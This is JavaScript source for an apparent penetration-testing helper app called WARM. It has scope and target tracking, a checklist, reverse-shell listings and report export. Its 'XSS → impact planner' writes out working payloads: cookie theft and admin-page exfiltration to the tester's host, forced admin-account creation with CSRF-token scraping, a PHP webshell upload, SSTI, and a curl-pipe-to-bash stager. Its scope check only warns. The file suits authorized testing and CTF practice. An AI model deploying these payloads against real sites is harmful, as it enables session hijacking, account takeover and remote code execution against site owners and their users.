/* WARM — client-side app (copy-only, no execution). */
(function () {
  "use strict";
  var M = window.METHODOLOGY, SITES = window.DORK_SITES || [], ENGINES = window.DORK_ENGINES || [],
      REV = window.REVSHELLS || [], LISTENERS = window.LISTENERS || [], TTY = window.TTY_UPGRADE || [],
      SETUP = window.SETUP || [];
  var LS = {
    get: function (k, d) { try { var v = localStorage.getItem(k); return v == null ? d : JSON.parse(v); } catch (e) { return d; } },
    set: function (k, v) { try { localStorage.setItem(k, JSON.stringify(v)); } catch (e) {} }
  };
  var K = { vars: "warm-vars", checks: "warm-checks", notes: "warm-notes", favs: "warm-favs", theme: "warm-theme", tab: "warm-tab", engine: "warm-engine", lists: "warm-lists" };

  var vars = LS.get(K.vars, {});
  var checks = LS.get(K.checks, {});
  var notes = LS.get(K.notes, {});
  var favs = LS.get(K.favs, []);
  M.variables.forEach(function (v) { if (vars[v.key] == null) vars[v.key] = v.def || ""; });

  // ---- multi-target lists (e.g. Target URLs / IPs): keep a list per field + a focused index.
  // vars[key] always mirrors the FOCUSED entry, so all {var} templating / report / scope guard are unchanged.
  var lists = LS.get(K.lists, {});
  M.variables.forEach(function (v) {
    if (!v.list) return;
    if (!lists[v.key] || !Array.isArray(lists[v.key].items)) {
      var seed = (vars[v.key] || "").split(/[\n,]+/).map(function (s) { return s.trim(); }).filter(Boolean);
      lists[v.key] = { items: seed, focus: 0 };
    }
    if (lists[v.key].focus >= lists[v.key].items.length) lists[v.key].focus = Math.max(0, lists[v.key].items.length - 1);
    syncFocus(v.key);
  });
  LS.set(K.lists, lists); LS.set(K.vars, vars);

  function syncFocus(key) { var L = lists[key]; if (L) vars[key] = L.items[L.focus] || ""; }
  function persistList(key) { syncFocus(key); LS.set(K.lists, lists); LS.set(K.vars, vars); }

  // ---- screenshots store (IndexedDB — images are too big for localStorage) ----
  // record: { id, phase, caption, dataUrl, ts }
  var DB = null, shots = [];
  function openShotDB(cb) {
    try {
      var r = indexedDB.open("warm-shots", 1);
      r.onupgradeneeded = function (e) {
        var db = e.target.result;
        if (!db.objectStoreNames.contains("shots")) db.createObjectStore("shots", { keyPath: "id" });
      };
      r.onsuccess = function (e) { DB = e.target.result; shotAll(function (all) { shots = all; cb && cb(); }); };
      r.onerror = function () { cb && cb(); };
    } catch (e) { cb && cb(); }
  }
  function shotTx(mode) { return DB.transaction("shots", mode).objectStore("shots"); }
  function shotPut(rec) { try { shotTx("readwrite").put(rec); } catch (e) {} }
  function shotDel(id) { try { shotTx("readwrite").delete(id); } catch (e) {} }
  function shotAll(cb) { var out = []; try { var c = shotTx("readonly").openCursor(); c.onsuccess = function (e) { var cur = e.target.result; if (cur) { out.push(cur.value); cur.continue(); } else cb(out); }; c.onerror = function () { cb(out); }; } catch (e) { cb(out); } }
  function shotsFor(phase) { return shots.filter(function (s) { return s.phase === phase; }).sort(function (a, b) { return a.ts - b.ts; }); }
  function addShot(phase, caption, dataUrl) {
    var rec = { id: uid(), phase: phase, caption: caption || "", dataUrl: dataUrl, ts: Date.now() };
    shots.push(rec); shotPut(rec); renderShots(phase);
  }
  function fileToShot(phase, file) {
    if (!file || !/^image\//.test(file.type)) return;
    var rd = new FileReader();
    rd.onload = function () { addShot(phase, file.name && file.name !== "image.png" ? file.name.replace(/\.[a-z]+$/i, "") : "", rd.result); };
    rd.readAsDataURL(file);
  }

  var $ = function (s, r) { return (r || document).querySelector(s); };
  function el(t, c, x) { var e = document.createElement(t); if (c) e.className = c; if (x != null) e.textContent = x; return e; }
  function esc(s) { return String(s).replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }
  function uid() { return Date.now().toString(36) + Math.random().toString(36).slice(2, 6); }

  // ---- variable resolution ----
  function hostOf(url) {
    if (!url) return "";
    try { return new URL(url).hostname; } catch (e) {}
    return url.replace(/^[a-z]+:\/\//i, "").split(/[\/:?#]/)[0] || "";
  }
  function resolved() {
    var r = {};
    M.variables.forEach(function (v) { r[v.key] = (vars[v.key] || "").trim(); });
    r.target_url = r.target_url.replace(/\/+$/, "");
    r.target_host = hostOf(r.target_url);
    return r;
  }
  function fill(tmpl) {
    var r = resolved();
    var plain = tmpl.replace(/\{(\w+)\}/g, function (m, k) { return r[k] != null && r[k] !== "" ? r[k] : m; });
    var html = esc(tmpl).replace(/\{(\w+)\}/g, function (m, k) {
      var val = r[k];
      return (val != null && val !== "") ? esc(val) : '<span class="ph-var">' + esc(m) + "</span>";
    });
    return { html: html, plain: plain, hasUnresolved: /\{\w+\}/.test(plain) };
  }

  // ---- scope guard (IPv4 + CIDR aware) ----
  function scopeList() { return (vars.scope || "").split(/\n+/).map(function (s) { return s.trim(); }).filter(Boolean); }
  function isCidr(s) { return /^\d{1,3}(\.\d{1,3}){3}\/\d{1,2}$/.test(s); }
  function isIp(s) { return /^\d{1,3}(\.\d{1,3}){3}$/.test(s); }
  function ip2int(ip) { var p = ip.split("."), n = 0; if (p.length !== 4) return null; for (var i = 0; i < 4; i++) { var o = +p[i]; if (isNaN(o) || o < 0 || o > 255) return null; n = n * 256 + o; } return n >>> 0; }
  function cidrHas(cidr, ip) { var pr = cidr.split("/"), base = ip2int(pr[0]), ii = ip2int(ip), bits = +pr[1]; if (base == null || ii == null || isNaN(bits)) return false; if (bits <= 0) return true; var mask = bits >= 32 ? 0xffffffff : (~((1 << (32 - bits)) - 1)) >>> 0; return ((base & mask) >>> 0) === ((ii & mask) >>> 0); }
  function hostOk(host) { if (!host) return true; return scopeList().some(function (s) { if (isCidr(s)) return false; return s === host || host.indexOf(s) !== -1 || s.indexOf(host) !== -1; }); }
  function ipOk(ip) { if (!ip) return true; return scopeList().some(function (s) { if (isCidr(s)) return cidrHas(s, ip); if (isIp(s)) return s === ip; return ip.indexOf(s) !== -1; }); }
  function updateScopeWarn() {
    var w = $("#scope-warn"); if (!w) return;
    if (!scopeList().length) { w.className = "scope-warn"; w.innerHTML = ""; return; }
    var r = resolved(), host = r.target_host || r.target_url, ip = r.target_ip, bad = [];
    if (host && !hostOk(host)) bad.push(host);
    if (ip && !ipOk(ip)) bad.push(ip);
    if (bad.length) { w.className = "scope-warn show"; w.innerHTML = "<b>Out of scope:</b> " + esc(bad.join(" / ")) + " not in your authorized scope. Commands still render (warn-but-allow)."; }
    else { w.className = "scope-warn"; w.innerHTML = ""; }
  }

  // ---- scope panel ----
  function buildScope() {
    var box = $("#scope-fields"); box.innerHTML = "";
    M.variables.forEach(function (v) {
      if (v.list) { box.appendChild(buildListField(v)); if (v.guard) box.appendChild(scopeWarnEl()); return; }
      var f = el("div", "field");
      var lab = el("label", null, v.label); lab.setAttribute("for", "v-" + v.key); f.appendChild(lab);
      var input = v.multi ? el("textarea") : el("input");
      if (!v.multi) input.type = "text";
      input.id = "v-" + v.key; input.placeholder = v.placeholder || ""; input.value = vars[v.key] || "";
      input.addEventListener("input", function () { vars[v.key] = input.value; LS.set(K.vars, vars); rerender(); });
      f.appendChild(input); box.appendChild(f);
      if (v.guard) box.appendChild(scopeWarnEl());
    });
  }
  function scopeWarnEl() { var w = el("div", "scope-warn"); w.id = "scope-warn"; return w; }

  // ---- list field: multiple targets + a focused one (◉) ----
  function buildListField(v) {
    var L = lists[v.key], f = el("div", "field listfield");
    f.appendChild(el("label", null, v.label));
    var wrap = el("div", "scope-list");
    L.items.forEach(function (item, i) {
      var row = el("div", "scope-item");
      var rb = el("input"); rb.type = "radio"; rb.name = "focus-" + v.key; rb.className = "focus-radio";
      rb.checked = (i === L.focus); rb.title = "Focus this one";
      rb.addEventListener("change", function () { L.focus = i; persistList(v.key); rerender(); buildScope(); });
      row.appendChild(rb);
      var inp = el("input"); inp.type = "text"; inp.value = item; inp.placeholder = v.placeholder || "";
      inp.addEventListener("input", function () { L.items[i] = inp.value; persistList(v.key); rerender(); });
      row.appendChild(inp);
      var rm = el("button", "cbtn rm", "×"); rm.type = "button"; rm.title = "Remove";
      rm.addEventListener("click", function () {
        L.items.splice(i, 1);
        if (i < L.focus) L.focus--;                                  // keep the same entry focused
        if (L.focus >= L.items.length) L.focus = Math.max(0, L.items.length - 1);
        persistList(v.key); rerender(); buildScope();
      });
      row.appendChild(rm); wrap.appendChild(row);
    });
    var addRow = el("div", "scope-item add");
    var ai = el("input"); ai.type = "text"; ai.placeholder = "+ add " + (v.label || v.key).replace(/ \(.*\)$/, "");
    var add = function () { var val = ai.value.trim(); if (!val) return; L.items.push(val); if (L.items.length === 1) L.focus = 0; persistList(v.key); rerender(); buildScope(); };
    ai.addEventListener("keydown", function (e) { if (e.key === "Enter") { e.preventDefault(); add(); } });
    var ab = el("button", "cbtn", "Add"); ab.type = "button"; ab.addEventListener("click", add);
    addRow.appendChild(ai); addRow.appendChild(ab); wrap.appendChild(addRow);
    f.appendChild(wrap);
    f.appendChild(el("div", "focus-current", "◉ focused: " + (L.items[L.focus] || "(none — add a target)")));
    return f;
  }

  // ---- shared command row ----
  function cmdRow(tool, tmpl, opts) {
    opts = opts || {};
    var row = el("div", "cmd" + (opts.note ? " isnote" : ""));
    row.appendChild(el("div", "tool", tool || ""));
    var pre = el("pre"); pre.dataset.tmpl = tmpl; row.appendChild(pre);
    if (!opts.note) {
      var copy = el("button", "cbtn", "Copy"); copy.type = "button";
      copy.addEventListener("click", function () { doCopy(tmpl, copy); });
      row.appendChild(copy);
      if (opts.mode === "fav") {
        var rm = el("button", "cbtn rm", "Remove"); rm.type = "button";
        rm.addEventListener("click", function () { removeFav(opts.favId); });
        row.appendChild(rm);
      } else {
        var star = el("button", "cbtn star", "☆"); star.type = "button"; star.title = "Save to Favorites";
        star.addEventListener("click", function () { addFav(tool, tmpl); star.textContent = "★"; star.classList.add("on"); setTimeout(function () { star.textContent = "☆"; star.classList.remove("on"); }, 1100); });
        row.appendChild(star);
      }
    }
    pre.innerHTML = fill(tmpl).html;
    return row;
  }

  // ---- methodology ----
  var cid = function (pi, ii) { return "c-" + pi + "-" + ii; };
  function buildPhases() {
    var main = $("#phases"); main.innerHTML = "";
    M.phases.forEach(function (ph, pi) {
      var d = el("details", "phase"); if (pi === 0) d.open = true; d.dataset.pi = pi;
      var s = el("summary");
      s.appendChild(el("span", "num", ph.num));
      var t = el("span", "ph-title"); t.appendChild(document.createTextNode(ph.title));
      t.appendChild(el("span", "ph-goal", ph.goal)); s.appendChild(t);
      s.appendChild(el("span", "ph-done", "")); s.appendChild(el("span", "chev", "›"));
      d.appendChild(s);
      var items = el("div", "items");
      ph.items.forEach(function (it, ii) {
        var item = el("div", "item"), head = el("div", "item-head");
        var cb = el("input"); cb.type = "checkbox"; cb.id = cid(pi, ii); cb.checked = !!checks[cid(pi, ii)];
        cb.addEventListener("change", function () { checks[cb.id] = cb.checked; LS.set(K.checks, checks); updateProgress(); });
        head.appendChild(cb);
        var meta = el("div", "item-meta"), lbl = el("div", "lbl");
        lbl.appendChild(document.createTextNode(it.label));
        if (it.sev) lbl.appendChild(el("span", "tag " + it.sev, it.sev));
        meta.appendChild(lbl);
        if (it.tell) meta.appendChild(el("div", "tell", it.tell));
        head.appendChild(meta); item.appendChild(head);
        var cmds = el("div", "cmds");
        if (it.exploit && it.exploit.length) cmds.appendChild(el("div", "tier-label", "Discover / confirm"));
        (it.cmds || []).forEach(function (c) { cmds.appendChild(cmdRow(c.tool, c.cmd, { note: c.note })); });
        item.appendChild(cmds);
        // nested second tier: what to actually DO with the bug once found
        if (it.exploit && it.exploit.length) {
          var ex = el("details", "exploit");
          var exs = el("summary", "exploit-sum");
          exs.appendChild(el("span", "exploit-chev", "›"));
          exs.appendChild(el("span", "exploit-title", "Exploit → gain access / escalate"));
          exs.appendChild(el("span", "exploit-count", String(it.exploit.length)));
          ex.appendChild(exs);
          var exb = el("div", "exploit-body");
          if (it.xtell) exb.appendChild(el("div", "tell xtell", it.xtell));
          var exc = el("div", "cmds");
          it.exploit.forEach(function (c) { exc.appendChild(cmdRow(c.tool, c.cmd, { note: c.note })); });
          exb.appendChild(exc); ex.appendChild(exb); item.appendChild(ex);
        }
        items.appendChild(item);
      });
      d.appendChild(items);
      var nb = el("div", "notes");
      var nl = el("label", null, "Findings / notes — " + ph.title); nl.setAttribute("for", "n-" + ph.id); nb.appendChild(nl);
      var na = el("textarea"); na.id = "n-" + ph.id; na.value = notes[ph.id] || ""; na.placeholder = "what you tried, what you found, evidence…";
      na.addEventListener("input", function () { notes[ph.id] = na.value; LS.set(K.notes, notes); });
      nb.appendChild(na);
      // paste an image directly into the notes box
      na.addEventListener("paste", function (e) {
        var items = (e.clipboardData || {}).items || [];
        for (var i = 0; i < items.length; i++) if (/^image\//.test(items[i].type)) { var f = items[i].getAsFile(); if (f) { e.preventDefault(); fileToShot(ph.id, f); } }
      });
      nb.appendChild(buildShotBlock(ph));
      d.appendChild(nb);
      main.appendChild(d);
    });
    renderAllShots();
  }

  // ---- screenshots UI ----
  function buildShotBlock(ph) {
    var box = el("div", "shots");
    var head = el("div", "shots-head");
    head.appendChild(el("span", "shots-label", "Screenshots — " + ph.title));
    var pick = el("label", "cbtn shot-add"); pick.textContent = "+ Add"; pick.title = "Add image(s) — or paste into the notes box above";
    var inp = el("input"); inp.type = "file"; inp.accept = "image/*"; inp.multiple = true; inp.style.display = "none";
    inp.addEventListener("change", function () { [].forEach.call(inp.files, function (f) { fileToShot(ph.id, f); }); inp.value = ""; });
    pick.appendChild(inp); head.appendChild(pick); box.appendChild(head);
    var grid = el("div", "shot-grid"); grid.id = "shots-" + ph.id; box.appendChild(grid);
    return box;
  }
  function renderAllShots() { M.phases.forEach(function (ph) { renderShots(ph.id); }); }
  function renderShots(phase) {
    var grid = $("#shots-" + phase); if (!grid) return; grid.innerHTML = "";
    var list = shotsFor(phase);
    if (!list.length) { grid.appendChild(el("div", "shot-empty", "no screenshots yet — paste into notes or + Add")); return; }
    list.forEach(function (s) {
      var card = el("div", "shot-card");
      var img = el("img"); img.src = s.dataUrl; img.alt = s.caption || "screenshot"; img.title = "click to open full size";
      img.addEventListener("click", function () { var w = window.open("", "_blank"); if (w) { var im = w.document.createElement("img"); im.src = s.dataUrl; im.style.maxWidth = "100%"; w.document.body.style.margin = "0"; w.document.body.appendChild(im); } });
      card.appendChild(img);
      var cap = el("input"); cap.type = "text"; cap.className = "shot-cap"; cap.value = s.caption; cap.placeholder = "caption…";
      cap.addEventListener("input", function () { s.caption = cap.value; shotPut(s); });
      card.appendChild(cap);
      var rm = el("button", "cbtn rm shot-rm", "×"); rm.type = "button"; rm.title = "Remove";
      rm.addEventListener("click", function () { if (!window.confirm("Remove this screenshot?")) return; shots = shots.filter(function (x) { return x.id !== s.id; }); shotDel(s.id); renderShots(phase); });
      card.appendChild(rm);
      grid.appendChild(card);
    });
  }

  // ---- reverse shells ----
  function buildRevshells() {
    var L = $("#listeners"); L.innerHTML = "";
    LISTENERS.forEach(function (c) { L.appendChild(cmdRow(c.name, c.cmd, {})); });
    var tty = $("#tty"); tty.textContent = TTY.join("\n");
    // language filter
    var langs = []; REV.forEach(function (r) { if (langs.indexOf(r.lang) < 0) langs.push(r.lang); });
    var sel = $("#rev-filter"); sel.innerHTML = "";
    var all = el("option"); all.value = ""; all.textContent = "all languages"; sel.appendChild(all);
    langs.forEach(function (l) { var o = el("option"); o.value = l; o.textContent = l; sel.appendChild(o); });
    sel.onchange = renderRevList;
    renderRevList();
  }
  function renderRevList() {
    var wrap = $("#revshells"); wrap.innerHTML = "";
    var f = $("#rev-filter").value;
    REV.filter(function (r) { return !f || r.lang === f; }).forEach(function (r) {
      wrap.appendChild(cmdRow(r.name, r.cmd, {}));
    });
  }

  // ---- dork search ----
  function buildDorks() {
    var es = $("#dork-engine"); es.innerHTML = "";
    ENGINES.forEach(function (e, i) { var o = el("option"); o.value = i; o.textContent = e.name; es.appendChild(o); });
    es.value = LS.get(K.engine, 0);
    es.onchange = function () { LS.set(K.engine, es.value); };
    var list = $("#dork-sites"); list.innerHTML = "";
    SITES.forEach(function (s, i) {
      var row = el("div", "site");
      var cb = el("input"); cb.type = "checkbox"; cb.checked = true; cb.id = "site-" + i; cb.dataset.dork = s.dork;
      row.appendChild(cb);
      var nm = el("label", "site-name", s.name); nm.setAttribute("for", "site-" + i); row.appendChild(nm);
      var only = el("button", "cbtn", "Only"); only.type = "button"; only.title = "Search just this site";
      only.addEventListener("click", function () { openDork([s.dork]); });
      row.appendChild(only);
      var ext = el("a", "cbtn ext", "↗"); ext.href = s.url; ext.target = "_blank"; ext.rel = "noopener"; ext.title = s.url;
      row.appendChild(ext);
      list.appendChild(row);
    });
    $("#dork-all").onclick = function () { toggleSites(true); };
    $("#dork-none").onclick = function () { toggleSites(false); };
    $("#dork-go").onclick = function () {
      var picked = [].filter.call(document.querySelectorAll("#dork-sites input:checked"), function () { return true; })
        .map(function (c) { return c.dataset.dork; });
      if (!picked.length) { flashHint("Select at least one site."); return; }
      openDork(picked);
    };
    $("#dork-q").addEventListener("keydown", function (e) { if (e.key === "Enter") $("#dork-go").click(); });
  }
  function toggleSites(on) { document.querySelectorAll("#dork-sites input[type=checkbox]").forEach(function (c) { c.checked = on; }); }
  function openDork(dorks) {
    var e = ENGINES[$("#dork-engine").value || 0] || ENGINES[0];
    var q = ($("#dork-q").value || "").trim();
    var sitePart = dorks.length ? "(" + dorks.join(" OR ") + ") " : "";
    var full = (sitePart + q).trim();
    window.open(e.base + encodeURIComponent(full), "_blank", "noopener");
  }
  function flashHint(msg) { var h = $("#dork-hint"); h.textContent = msg; h.classList.add("show"); setTimeout(function () { h.classList.remove("show"); }, 2200); }

  // ---- setup ----
  function buildSetup() {
    var wrap = $("#setup-list"); if (!wrap) return; wrap.innerHTML = "";
    SETUP.forEach(function (g) {
      var panel = el("div", "panel");
      panel.appendChild(el("h3", null, g.group));
      if (g.note) { var n = el("p", "setup-note", g.note); panel.appendChild(n); }
      var cmds = el("div", "cmds inset");
      (g.cmds || []).forEach(function (c) { cmds.appendChild(cmdRow(c.tool, c.cmd, {})); });
      panel.appendChild(cmds); wrap.appendChild(panel);
    });
  }

  // ---- favorites ----
  function addFav(tool, tmpl) {
    if (favs.some(function (f) { return f.tmpl === tmpl; })) return;
    favs.push({ id: uid(), tool: tool || "cmd", tmpl: tmpl }); LS.set(K.favs, favs);
    if ($("#tab-favorites") && !$("#tab-favorites").hidden) buildFavorites();
    updateFavCount();
  }
  function removeFav(id) { favs = favs.filter(function (f) { return f.id !== id; }); LS.set(K.favs, favs); buildFavorites(); updateFavCount(); }
  function updateFavCount() { var b = $("#fav-count"); if (b) b.textContent = favs.length ? "(" + favs.length + ")" : ""; }
  function buildFavorites() {
    var wrap = $("#fav-list"); wrap.innerHTML = "";
    if (!favs.length) { wrap.appendChild(el("p", "empty", "No favorites yet. Hit ☆ on any command, or add one below.")); }
    else favs.forEach(function (f) { wrap.appendChild(cmdRow(f.tool, f.tmpl, { mode: "fav", favId: f.id })); });
    updateFavCount();
  }

  // ---- copy ----
  function doCopy(tmpl, btn) {
    var out = fill(tmpl), old = btn.textContent;
    var done = function () {
      btn.textContent = out.hasUnresolved ? "Copied ⚠" : "Copied ✓";
      btn.classList.add(out.hasUnresolved ? "warn-copy" : "ok");
      setTimeout(function () { btn.textContent = old; btn.classList.remove("ok", "warn-copy"); }, 1300);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(out.plain).then(done, function () { legacy(out.plain); done(); });
    else { legacy(out.plain); done(); }
  }
  function legacy(text) { var ta = el("textarea"); ta.value = text; ta.style.cssText = "position:fixed;opacity:0"; document.body.appendChild(ta); ta.select(); try { document.execCommand("copy"); } catch (e) {} document.body.removeChild(ta); }

  // ---- live re-render + progress ----
  // ---- XSS -> impact planner ----
  var XSP = { type: "stored", viewer: "yes", httponly: "yes", csp: "open", next: "admin" };
  var XSP_FIELDS = [
    { k: "type", label: "XSS type", opts: [["stored", "Stored"], ["reflected", "Reflected"], ["blind", "Blind"], ["self", "DOM / self-only"]] },
    { k: "viewer", label: "Privileged viewer?", opts: [["yes", "Yes — admin / bot / other user"], ["unknown", "Unknown"], ["no", "No — only me"]] },
    { k: "httponly", label: "Session cookie HttpOnly?", opts: [["yes", "Yes"], ["no", "No"], ["unknown", "Unknown"]] },
    { k: "csp", label: "Egress to my host", opts: [["open", "fetch() works"], ["strict", "only img / navigation"], ["unknown", "Unknown"]] },
    { k: "next", label: "Privileged area exposes…", opts: [["admin", "Admin action (promote / create user)"], ["ssti", "Template field (SSTI)"], ["upload", "File upload"], ["cmdi", "Internal command endpoint"], ["data", "Just data / the flag in the page"]] }
  ];
  function buildXssPlanner() {
    var box = $("#xss-inputs"); if (!box) return;
    box.innerHTML = "";
    XSP_FIELDS.forEach(function (f) {
      var wrap = el("label", "planner-field");
      wrap.appendChild(el("span", "planner-lbl", f.label));
      var sel = el("select", "select"); sel.dataset.k = f.k;
      f.opts.forEach(function (o) { var op = el("option"); op.value = o[0]; op.textContent = o[1]; if (XSP[f.k] === o[0]) op.selected = true; sel.appendChild(op); });
      sel.addEventListener("change", function () { XSP[f.k] = sel.value; renderXssOut(); });
      wrap.appendChild(sel); box.appendChild(wrap);
    });
    renderXssOut();
  }
  function ckExfil() {
    return XSP.csp === "open"
      ? "<script>fetch('http://{tester_ip}:{tester_port}/c',{method:'POST',body:document.cookie})</script>"
      : "<script>new Image().src='http://{tester_ip}:{tester_port}/c?'+encodeURIComponent(document.cookie)</script>";
  }
  function srcExfil() {
    return "<script>fetch('{target_url}/admin',{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src='http://{tester_ip}:{tester_port}/a?d='+encodeURIComponent(t.slice(0,3000)))</script>";
  }
  function renderXssOut() {
    var out = $("#xss-out"); if (!out) return;
    out.innerHTML = "";
    var steps = [], pays = [], verdict, vclass = "ok";

    if (XSP.type === "self" || XSP.viewer === "no") {
      vclass = "warn";
      verdict = "Low value here: no privileged viewer, so your JS only runs as you (self-XSS). This rarely reaches proof. Confirm there's truly no admin/bot/other user who sees this input — if there isn't, log the finding and pivot to another vuln rather than sinking time in it.";
    } else if (XSP.viewer === "unknown" || XSP.type === "blind") {
      verdict = "Promising but unconfirmed: you don't yet know where it fires or as whom. Beacon FIRST (below) to prove execution and learn the context, then build the real payload.";
    } else {
      verdict = "Strong: your JS runs inside a privileged session. alert() is done — go straight to impact. Pick the highest rung you can reach.";
    }

    // 0. beacon for blind / unknown viewer
    if (XSP.type === "blind" || XSP.viewer === "unknown") {
      steps.push(["0 · Beacon first", "Prove it runs and learn the context (URL it fires on, whether you can read the cookie) before committing to a payload."]);
      pays.push(["beacon (where + cookie)", "<img src=x onerror=\"this.src='http://{tester_ip}:{tester_port}/hit?u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie)\">"]);
    }

    // delivery
    if (XSP.type === "reflected") steps.push(["Delivery", "Reflected → you must get a privileged user to your URL. If a bot reviews submitted content, drop the link where it'll be seen; otherwise craft and deliver the URL."]);
    else if (XSP.type === "stored") steps.push(["Delivery", "Stored → plant once; the privileged viewer triggers it on their next visit. Load a remote stager so you can iterate without re-injecting."]);
    if (XSP.type !== "self" && XSP.viewer !== "no") pays.push(["stager (iterate freely)", "<script src=http://{tester_ip}:{tester_port}/x.js></script>   // edit x.js on your box; the bot re-runs it next visit"]);

    // session
    if (XSP.httponly === "no") {
      steps.push(["Session", "Cookie is NOT HttpOnly → steal it and ride the session."]);
      pays.push(["steal cookie", ckExfil()]);
      pays.push(["then: ride it", "scripts/ride-session.sh {target_url} 'SESSION=<stolen value>'"]);
    } else if (XSP.httponly === "yes") {
      steps.push(["Session", "Cookie IS HttpOnly → you can't read it, so don't try. ACT in the session instead: fetch() sends their cookie automatically."]);
    } else {
      steps.push(["Session", "Unknown — test it: curl -sI {target_url} | grep -i set-cookie. No HttpOnly flag → steal the cookie; HttpOnly present → act in-session (below)."]);
    }

    // top impact by what the privileged area exposes
    var ladder = {
      admin: ["Impact · take over / escalate (TOP)", "Do the privileged action yourself in their session. No token: fire it. Token present: GET the form, scrape the token, POST it back.",
        [["action, no token", "<script>fetch('{target_url}/admin/promote',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'user=me&role=admin'})</script>"],
         ["token-aware chain", "<script>fetch('{target_url}/admin/users/new',{credentials:'include'}).then(r=>r.text()).then(h=>{var t=h.match(/name=\"(?:csrf|_token|authenticity_token)\" value=\"([^\"]+)\"/)[1];fetch('{target_url}/admin/users/new',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'_token='+t+'&username=pwn&password=Pwn123!&role=admin'})})</script>"]]],
      ssti: ["Impact · pivot to RCE via SSTI", "The privileged area has a template field. Submit an SSTI payload to it through the victim's session, then collect output. Use the exact engine payload from the SSTI phase.",
        [["drive SSTI (Twig example)", "<script>fetch('{target_url}/admin/template',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'tpl='+encodeURIComponent(\"{{[0]|reduce('system','id')}}\")})</script>"]]],
      upload: ["Impact · pivot to RCE via upload", "Fetch the authed upload endpoint as them and POST a webshell file; then browse to it. Swap field names/paths to the real ones (read them from the admin page/source first).",
        [["drive upload (webshell)", "<script>var f=new FormData();f.append('file',new Blob([\"<?php system($_GET[0]);?>\"],{type:'text/php'}),'s.php');fetch('{target_url}/admin/upload',{method:'POST',credentials:'include',body:f})</script>"]]],
      cmdi: ["Impact · pivot to RCE via internal endpoint", "The app exposes a localhost-only 'run' endpoint the bot's browser can reach (you can't, from outside). Drive it to pull and run a stager. Fix the port/param from JS or the exfiltrated source.",
        [["drive internal RCE", "<script>fetch('http://localhost:3000/run_command',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cmd=curl http://{tester_ip}:{tester_port}/rce.sh|bash'})</script>"]]],
      data: ["Impact · exfil what they can see", "The flag / a hidden endpoint / secrets are often right in the privileged DOM. Read the admin page as them and ship its source to your listener; decode offline.",
        [["read admin page + exfil", srcExfil()], ["exfil full source", "<script>location.href='http://{tester_ip}:{tester_port}/?exfil='+btoa(document.body.innerHTML)</script>"]]]
    };
    var top = ladder[XSP.next] || ladder.admin;
    if (XSP.type !== "self" && XSP.viewer !== "no") {
      steps.push([top[0], top[1]]);
      top[2].forEach(function (p) { pays.push(p); });
      // always remind them the flag is often just readable
      if (XSP.next !== "data") pays.push(["also try: read the admin page", srcExfil()]);
    }

    // render verdict + steps + payloads
    var vd = el("div", "planner-verdict " + vclass); vd.textContent = verdict; out.appendChild(vd);
    steps.forEach(function (s) {
      var st = el("div", "step");
      st.appendChild(el("div", "q", s[0])); st.appendChild(el("div", "a", s[1]));
      out.appendChild(st);
    });
    if (pays.length) {
      var ph = el("div", "planner-pays");
      ph.appendChild(el("div", "planner-lbl", "Payloads (scoped — Copy or ☆):"));
      var cc = el("div", "cmds inset");
      pays.forEach(function (p) { cc.appendChild(cmdRow(p[0], p[1])); });
      ph.appendChild(cc); out.appendChild(ph);
    }
  }

  function rerender() {
    updateScopeWarn();
    document.querySelectorAll(".cmd pre").forEach(function (pre) { pre.innerHTML = fill(pre.dataset.tmpl).html; });
  }
  function updateProgress() {
    var total = 0, done = 0;
    M.phases.forEach(function (ph, pi) {
      var pt = 0, pd = 0;
      ph.items.forEach(function (it, ii) { pt++; total++; if (checks[cid(pi, ii)]) { pd++; done++; } });
      var d = document.querySelector('details.phase[data-pi="' + pi + '"] .ph-done'); if (d) d.textContent = pd + "/" + pt;
    });
    $("#count").textContent = done + " / " + total;
    $("#barfill").style.width = (total ? Math.round(done / total * 100) : 0) + "%";
  }

  // ---- report ----
  function buildReport() {
    var r = resolved(), L = [];
    L.push("# WARM — Assessment Report", "");
    L.push("- Date: " + new Date().toISOString());
    L.push("- Focused URL: " + (r.target_url || "(none)"));
    L.push("- Focused IP: " + (r.target_ip || "(none)"));
    var uL = lists.target_url, iL = lists.target_ip;
    if (uL && uL.items.length > 1) L.push("- All target URLs: " + uL.items.map(function (u, i) { return u + (i === uL.focus ? " (focused)" : ""); }).join(", "));
    if (iL && iL.items.length > 1) L.push("- All target IPs: " + iL.items.map(function (p, i) { return p + (i === iL.focus ? " (focused)" : ""); }).join(", "));
    L.push("- Authorized scope: " + (scopeList().join(", ") || "(none set)"));
    L.push("- Tester IP(s): " + (r.tester_ip || "(none)") + " · listener port: " + (r.tester_port || "(none)"));
    L.push("");
    M.phases.forEach(function (ph, pi) {
      L.push("## " + ph.num + " · " + ph.title);
      ph.items.forEach(function (it, ii) { L.push("- [" + (checks[cid(pi, ii)] ? "x" : " ") + "] " + it.label + (it.sev ? " (" + it.sev + ")" : "")); });
      if ((notes[ph.id] || "").trim()) L.push("", "**Notes:**", "", notes[ph.id].trim());
      var sl = shotsFor(ph.id);
      if (sl.length) { L.push("", "**Screenshots:** " + sl.length + " (embedded in the HTML export)"); sl.forEach(function (s, i) { L.push("- " + (s.caption || ("screenshot " + (i + 1)))); }); }
      L.push("");
    });
    return L.join("\n");
  }
  // full standalone HTML report with screenshots embedded inline (open -> print to PDF, or paste into your doc)
  function buildReportHTML() {
    var r = resolved();
    function esc2(s) { return esc(String(s == null ? "" : s)); }
    var h = ['<!doctype html><html><head><meta charset="utf-8"><title>WARM Report ' + esc2(r.target_host || "") + '</title>',
      '<style>body{font:14px/1.5 system-ui,Segoe UI,Arial,sans-serif;max-width:900px;margin:24px auto;padding:0 18px;color:#111}',
      'h1{margin:0 0 4px}h2{margin:28px 0 6px;border-bottom:2px solid #ddd;padding-bottom:3px}',
      '.meta{color:#444;font-size:13px}.meta div{margin:1px 0}ul.ck{margin:6px 0;padding-left:20px}',
      'pre.notes{white-space:pre-wrap;background:#f6f6f6;border:1px solid #e2e2e2;border-radius:6px;padding:10px}',
